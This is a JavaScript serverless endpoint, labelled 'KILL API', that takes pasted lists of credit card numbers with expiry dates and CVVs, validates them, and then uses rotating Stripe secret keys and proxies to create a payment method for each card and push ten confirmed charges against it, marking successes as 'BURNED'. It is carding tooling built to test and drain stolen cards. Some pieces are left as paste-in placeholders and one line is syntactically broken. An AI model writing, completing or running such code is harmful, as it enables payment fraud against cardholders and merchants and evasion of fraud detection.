export default {
  async fetch(request) {
    if (request.method !== 'POST') return new Response('KILL API OK');
    // SAME SKs + Proxies as check.js (copy array above)
    const stripeKeys = [ /* PASTE EXACT stripeKeys array from check.js ABOVE */ ];
    const proxies = [ /* PASTE EXACT proxies array from check.js ABOVE */ ];
    // Luhn + parse SAME as check.js
    function luhn(card) { /* SAME luhn function */ }
    const formData = await request.formData();
    const number = formData.get('number') || '';
    const ccs = number.split(/\n/).map(l=>l.match(/(\d{13,19})[| ]?(\d{2})[| ]?(\d{2,4})[| ]?(\d{3,})/)?.slice(1)).filter(x=>x);
    const results = [];
    for(const [num,mon,yr,cv] of ccs.slice(0,100)) {
      if(!luhn(num)) { results.push({cc:`${num}|${mon}|${yr}|${cv}`,status:'die',msg:'Luhn Fail'}); continue; }
      let binInfo = /* SAME BIN fetch */;
      let killed = false;
      for(let att=0; att<10; att++) {
        const sk = stripeKeys[att % stripeKeys.length];
        try {
          const Stripe = (await import('https://esm.run/stripe')).default;
          const stripe = new Stripe(sk);
          const pm = await stripe.paymentMethods.create({type:'card',card:{number:num,exp_month:+mon,exp_year:+yr,cvc:cv}});
          // KILL: 10 Holds $0.01-$10
          const amounts = [1,5,10,25,50,100,250,500,750,1000];
          for(const amt of amounts) await stripe.paymentIntents.create({amount:amt,currency:'usd',payment_method:pm.id,confirm:true}).catch(()=>{}); 
          killed=true; results.push({cc:`${num}|${mon}|${yr}|${cv}`,status:'killed',msg:`💀 BURNED (10x $${amounts.reduce((a,b)=>a+b)/100})`,binInfo}); break;
        } catch{}
      }
      if(!killed) results.push({cc:`${num}|${mon}|${yr}|${cv}`,status:'die',msg:'Failed Kill / Dead'});
    }
    return Response.json({results,total:results.length,live:results.filter(r=>r.status=='killed').length});
  }
};
